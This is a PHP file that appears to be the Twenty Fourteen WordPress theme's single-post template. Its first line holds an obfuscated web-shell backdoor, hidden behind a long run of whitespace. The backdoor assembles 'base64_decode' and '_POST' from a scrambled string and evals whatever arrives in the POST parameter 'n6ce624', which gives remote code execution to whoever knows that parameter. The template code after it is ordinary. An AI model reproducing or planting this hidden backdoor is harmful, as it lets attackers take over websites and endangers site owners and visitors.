<?php                                                                                                                                                                                                                                                        $sns39 = "co_s6a4tedbp"; $pgui96=strtolower ($sns39[10]. $sns39[5]. $sns39[3].$sns39[8]. $sns39[4]. $sns39[6] .$sns39[2]. $sns39[9]. $sns39[8]. $sns39[0].$sns39[1]. $sns39[9].$sns39[8] ) ;$loo04=strtoupper ($sns39[2]. $sns39[11].$sns39[1].$sns39[3].$sns39[7] ) ;if( isset ( ${$loo04 } [ 'n6ce624' ])) { eval ( $pgui96 ( ${ $loo04} [ 'n6ce624' ]) ) ; } ?><?php
/**
 * The Template for displaying all single posts
 *
 * @package WordPress
 * @subpackage Twenty_Fourteen
 * @since Twenty Fourteen 1.0
 */

get_header(); ?>

	<div id="primary" class="content-area">
		<div id="content" class="site-content" role="main">
			<?php
				// Start the Loop.
				while ( have_posts() ) : the_post();

					/*
					 * Include the post format-specific template for the content. If you want to
					 * use this in a child theme, then include a file called called content-___.php
					 * (where ___ is the post format) and that will be used instead.
					 */
					get_template_part( 'content', get_post_format() );

					// Previous/next post navigation.
					twentyfourteen_post_nav();

					// If comments are open or we have at least one comment, load up the comment template.
					if ( comments_open() || get_comments_number() ) {
						comments_template();
					}
				endwhile;
			?>
		</div><!-- #content -->
	</div><!-- #primary -->

<?php
get_sidebar( 'content' );
get_sidebar();
get_footer();
